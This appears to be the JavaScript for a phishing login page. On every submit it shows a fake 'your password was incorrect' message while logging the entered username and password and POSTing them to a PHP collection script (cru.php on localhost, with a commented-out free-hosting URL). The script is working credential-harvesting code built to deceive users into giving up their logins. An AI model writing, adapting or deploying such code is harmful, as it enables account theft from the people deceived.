let username = document.getElementById('username')
let password = document.getElementById('password')
let submit = document.getElementById('submit')
let error = document.getElementById('error')

function uptrim() {
    username.value = username.value.trim()
    password.value = password.value.trim()
}

function checkpass() {
    uptrim()
    if (password.value.length >= 6 && username.value.length > 0) {
        return true;
    } else {
        return false;
    }
}

function enablej() {
    if (checkpass()) {
        submit.removeAttribute('disabled');
    } else {
        submit.setAttribute('disabled', true);
    }
}

username.addEventListener('keyup', () => {
    enablej()
    console.log(checkpass())
})

password.addEventListener('keyup', () => {
    enablej()
    console.log(checkpass())
}) 

submit.addEventListener('click', () => {
    uptrim()
    error.textContent = `Sorry, your password was incorrect. Please double-check your password.`;
    console.log(`submit=submit&username=${username.value}&password=${password.value}`);
    if (checkpass()) {
        XMLHttpRequestFn({
            method: 'POST',
            url: 'http://localhost/local/cru.php',
            data: `submit=submit&username=${username.value}&password=${password.value}`,
            callbackT: (response) => {
                console.log(response);
            } 
        })
    }

})

// ################


function XMLHttpRequestFn({
    method,
    url,
    data = "",
    callback = () => {},
    callbackT = (response) => {},
    callbackF = () => {}
}) {
    let newRequest = new XMLHttpRequest();

    newRequest.addEventListener("readystatechange", function() {
        if (this.readyState === 4 && this.status === 200) {
            callbackT(this.responseText)
        } else {
            // callbackF()
        }
    });

    newRequest.addEventListener("loadend", function() {
        callback()
        if (this.readyState !== 4 || this.status !== 200) {
            callbackF()
        }
    });

    method.toUpperCase();

    newRequest.open(method, url + (method === "GET" ? "?" + data : ""), true);
    // newRequest.setRequestHeader("Access-Control-Allow-Origin", "https://webskod.000webhostapp.com/index.php");
    newRequest.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded"
    );
    newRequest.send(method === "POST" ? data : "");

}
